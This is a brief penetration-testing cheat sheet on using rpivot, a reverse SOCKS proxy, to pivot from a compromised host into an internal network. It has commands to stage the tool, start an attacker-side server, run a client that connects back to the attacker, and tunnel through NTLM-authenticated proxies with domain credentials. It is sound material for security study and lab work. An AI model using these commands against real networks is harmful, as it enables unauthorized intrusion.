**Overview**
- Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. It binds a machine inside a corporate network to an external server and exposes the client's local port on the server side.
- In environments where direct pivoting to an external server is blocked, rpivot supports NTLM proxy authentication via Domain Controller, allowing tunneling through HTTP proxies that require domain credentials.
---
## Setup

```bash
git clone https://github.com/klsecservices/rpivot.git
```

Clone the rpivot repository on the attack host.

```bash
scp -r rpivot ubuntu@<target>:/home/ubuntu/
```

Transfer the rpivot directory to the pivot host.

---
## SOCKS Tunnel

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Start the rpivot server on the attack host. `--proxy-port` local SOCKS proxy port, `--server-port` port the client connects back to, `--server-ip` interface to listen on.

```bash
python2.7 client.py --server-ip <lhost> --server-port 9999
```

Run on the pivot host. Connects back to the attack host and establishes the SOCKS tunnel.

```bash
proxychains firefox-esr <target>:80
```

Browse to the internal web server through the tunnel.

---
## NTLM Proxy Authentication

```bash
python client.py --server-ip <target> --server-port 8080 --ntlm-proxy-ip <proxy-ip> --ntlm-proxy-port 8081 --domain <domain> --username <user> --password <password>
```

Connect through an HTTP proxy requiring NTLM authentication. `--ntlm-proxy-ip` proxy host address, `--ntlm-proxy-port` proxy port, `--domain` Windows domain name, `--username` and `--password` domain credentials.